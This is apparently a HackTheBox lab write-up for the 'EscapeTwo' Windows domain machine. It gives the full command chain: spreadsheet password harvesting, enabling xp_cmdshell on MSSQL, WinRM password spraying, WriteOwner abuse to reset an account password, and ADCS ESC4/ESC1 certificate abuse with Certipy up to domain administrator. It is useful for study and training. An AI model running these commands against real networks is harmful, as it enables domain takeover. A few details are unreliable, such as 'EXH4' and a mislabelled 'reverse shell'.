# EscapeTwo (AD)

\*\*As is common in real life Windows pentests, you will start this box with credentials for the following account: rose / KxEPkKe6R8su .

* Enumerate shares :

```python
smbclient -L //10.10.11.51/ -U rose  -p 'KxEPkKe6R8su'
```

* Connect to most sus share :

```python
smbclient //10.10.11.51/Accounting\ Department -U rose
```

* Download accounts.xlsx on kali to invistigate it

```python
get accounts.xlsx
unzip accounts.xlsx
```

```python
 grep -ri 'username' .
```

The grep resulted on xml data thus i parsed it.

| First Name | Last Name | Email             | Username | Password         |
| ---------- | --------- | ----------------- | -------- | ---------------- |
| Angela     | Martin    | angela@sequel.htb | angela   | 0fwz7Q4mSpurIt99 |
| Oscar      | Martinez  | oscar@sequel.htb  | oscar    | 86LxLBMgEWaKUnBG |
| Kevin      | Malone    | kevin@sequel.htb  | kevin    | Md9Wlq1E5bZnVDVo |
| NULL       | sa        | sa@sequel.htb     | sa       | MSSQLP@ssw0rd!   |

Connect to the database using sa and mssqlclient.py Impackets

<pre class="language-python"><code class="lang-python"><strong>python3 mssqlclient.py 'sa:MSSQLP@ssw0rd!@10.10.11.51' -port 1433 
</strong></code></pre>

Now lets enable the shell and enumerate directories

#### 1. **Enable xp\_cmdshell on MSSQL**:

By default, `xp_cmdshell` (the extended stored procedure that allows executing shell commands) is disabled for security reasons. You can enable it if you have sufficient permissions (such as `sa`).

To enable `xp_cmdshell`, execute the following SQL commands:

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; 
RECONFIGURE;
```

These commands allow `xp_cmdshell` to be used to execute shell commands.

#### 2. **Use xp\_cmdshell to Enumerate Files**:

Once `xp_cmdshell` is enabled, you can use it to execute system commands. For example, to list files in the `C:\` directory, you can run:

```sql
EXEC xp_cmdshell 'dir C:\';
```

#### 3. **Look for the Configuration File**:

You can use `xp_cmdshell` to navigate the file system and search for the SQL configuration file that contains the password. I found it :)

```sql
EXEC xp_cmdshell 'type "C:\SQL2019\ExpressAdv_ENU\sql-configuration.INI"'; 
```

***

Lets spray password found on other users

```
nxc smb [10.10.11.51](http://10.10.11.51/) -u rose -p 'KxEPkKe6R8su' --users
```

```sh
 nxc winrm 10.10.11.51 -u 'Administrator' -p 'WqSZAF6CysDQbGb3'        
nxc winrm 10.10.11.51 -u 'michael' -p 'WqSZAF6CysDQbGb3' nxc winrm 10.10.11.51 -u 'ryan' -p 'WqSZAF6CysDQbGb3' 
nxc winrm 10.10.11.51 -u 'oscar' -p 'WqSZAF6CysDQbGb3'       
nxc winrm 10.10.11.51 -u 'ca_svc' -p 'WqSZAF6CysDQbGb3'       

WINRM       10.10.11.51     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
WINRM       10.10.11.51     5985   DC01             [-] sequel.htb\Administrator:WqSZAF6CysDQbGb3
WINRM       10.10.11.51     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
WINRM       10.10.11.51     5985   DC01             [+] sequel.htb\ryan:WqSZAF6CysDQbGb3 (Pwn3d!)
WINRM       10.10.11.51     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
WINRM       10.10.11.51     5985   DC01             [-] sequel.htb\oscar:WqSZAF6CysDQbGb3
```

Only ryan has winrm acces , lets have a reverse shell than

```
evil-winrm -i 10.10.11.51 -u 'ryan' -p 'WqSZAF6CysDQbGb3'
```

Nothing Clear found on the machine , lets bloodhound than

```sh
bloodhound-python -u ryan -p 'WqSZAF6CysDQbGb3' -c All -d sequel.htb -ns 10.10.11.51 --zip 
```

**Using Kerberoasting for Escalation\*\* (same as ADMINISTRATOR but didnt work , password is not crackable)**

#### **. Understand the Context**

* **`ca_svc` is Kerberoastable**: You can extract its TGS (Ticket Granting Service) ticket and attempt to crack the hash offline.
* **`ryan` has `WriteOwner` privilege**: This allows you to change the owner of the `ca_svc` account, modify its attributes, or reset its password.

Both approaches can escalate your privileges depending on the scenario.

***

#### **2. Using the `WriteOwner` Privilege to Escalate Privileges**

The `WriteOwner` privilege allows `ryan` to take ownership of the `ca_svc` account. After taking ownership, you can modify `ca_svc`'s attributes or reset its password to gain control.

**Steps:**

```js
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p WqSZAF6CysDQbGb3 set owner ca_svc ryan
python dacledit.py -action 'write' -rights 'FullControl' -principal 'ryan' -target ca_svc 'sequel.htb/ryan:WqSZAF6CysDQbGb3'
bloodyAD -u "ryan" -p "WqSZAF6CysDQbGb3" -d "sequel.htb" --host "10.10.11.51" set password "ca_svc" "zlagalaga"
certipy-ad template -username ca_svc@sequel.htb -password 'zlagalaga' -template DunderMifflinAuthentication -save-old -dc-ip 10.10.11.51
certipy-ad req -u ca_svc@sequel.htb -p zlagalaga -ca sequel-DC01-CA -target sequel.htb -template DunderMifflinAuthentication -upn administrator@sequel.htb -debug
```

1. **Set `ryan` as the Owner of `ca_svc`:** Use tools like **`bloodHound.py`** or **`PowerView`** to take ownership:

```python
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p WqSZAF6CysDQbGb3 set owner ca_svc ryan
```

2. **Grant `ryan` FullControl on `ca_svc`:** After ownership, grant yourself full control:

```python
python dacledit.py -action 'write' -rights 'FullControl' -principal 'ryan' -target ca_svc 'sequel.htb/ryan:WqSZAF6CysDQbGb3'
```

3. **Reset the `ca_svc` Password:** Now that you have control, reset the `ca_svc` password:

```python
bloodyAD -u "ryan" -p "WqSZAF6CysDQbGb3" -d "sequel.htb" --host "10.10.11.51" set password "ca_svc" "zlagalaga"
```

***

4. As observed, ADCS is being utilized on the machine. We can then use `Certipy` with the `find` command to identify templates Lets scan for certificate vulnerabilitie using ca\_svc creds

```sh
certipy-ad find -u 'ca_svc' -p 'zlagalaga' -dc-ip 10.10.11.51 -dns-tcp -ns 10.10.11.51 -debug
```

```sh
cat 20250114122324_Certipy.txt  
```

```java
    [!] Vulnerabilities
      ESC4                              : 'SEQUEL.HTB\\Cert Publishers' has dangerous permissions
```

We can refer to this https://seriotonctf.github.io/2024/03/17/Sendai-Vulnlab/ wich follows nearly the same steps or this YouTube video [AD CS ESC4 Privilege Escalation Tutorial](https://www.youtube.com/watch?v=EuQ6jiKK7q0) which explains how to abuse ESC4.

5.

```js
certipy-ad template -username ca_svc@sequel.htb -password 'zlagalaga' -template DunderMifflinAuthentication -save-old -dc-ip 10.10.11.51

```

Now, if we run the Certipy find command again, it will indicate that the template is vulnerable to ESC1. ESC2, ESC3 and ESC4 !\[\[Pasted image 20250114191043.png]] 6.

```js
certipy-ad req -u ca_svc@sequel.htb -p zlagalaga -ca sequel-DC01-CA -target sequel.htb -template DunderMifflinAuthentication -upn administrator@sequel.htb -debug
```

That was successful, we got the `administrator.pfx` file, which we can use to obtain a TGT and the NTLM hash for the administrator user.

```sh
evil-winrm -i 10.10.11.51 -u administrator -H '7a8d4e04986afa8ed4060f75e5a0b3ff'
```

## To summarize

* Connect to the SMB share and download the `accounts.xlsx` file to extract usernames and passwords.
* Use the `sa` credentials to connect to the SQL Server and enable `xp_cmdshell` for executing system commands.
* Enumerate files using `xp_cmdshell`, discovering important configuration files, including one with SQL configuration details.
* Attempt password spraying and gain access to the `ryan` account via WinRM, establishing a reverse shell.
* Using BloodHound, you exploit the **WriteOwner** privilege on the `ca_svc` account to gain control and reset its password.
* Then, leveraging Certipy, you identify and exploit the **EXH4 vulnerability** in ADCS to request a service ticket. This escalates your privileges, granting you domain administrator access.
* Abuse ADCS vulnerabilities with Certipy to obtain an administrator certificate, gaining access to the administrator account and escalating privileges.
